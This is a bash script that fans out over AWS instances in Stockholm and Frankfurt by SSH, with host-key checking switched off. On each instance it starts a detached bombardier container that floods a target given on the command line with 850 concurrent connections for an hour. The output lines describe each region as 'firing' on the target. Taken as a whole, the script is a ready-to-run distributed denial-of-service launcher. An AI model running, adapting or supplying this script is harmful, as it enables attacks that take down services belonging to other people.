#!/bin/bash

main(){
	./updateInstancesIPs.sh

	if [ -f STOCKHOLM_INSTANCES_IPS.txt ]
	then
		echo "Stockholm fires on $1 by:"
		fire "key-stockholm-1.pem" "${@}" "$(cat STOCKHOLM_INSTANCES_IPS.txt)"
	fi

	if [ -f FRANKFURT_INSTANCES_IPS.txt ]
	then
		echo "Frankfurt fires on $1 by:"
		fire "key-frankfurt-1.pem" "${@}" "$(cat FRANKFURT_INSTANCES_IPS.txt)"
	fi
}

fire(){
	local key=${1}
	local target=${2}
	shift 2

	for ip in ${@}
	do
		process ${key} ${target} ${ip} &
	done
}

process(){
	echo "${3}"
	ssh \
		-o LogLevel=ERROR \
		-i "${1}" \
		-o "StrictHostKeyChecking no" "ubuntu@${3}" \
		screen \
			-dm sudo docker run \
			-ti \
			--rm alpine/bombardier \
			-c 850 \
			-d 3600s \
			-l ${2}
}

./checkAWS.sh && main ${@} || ./awsCliNa.sh
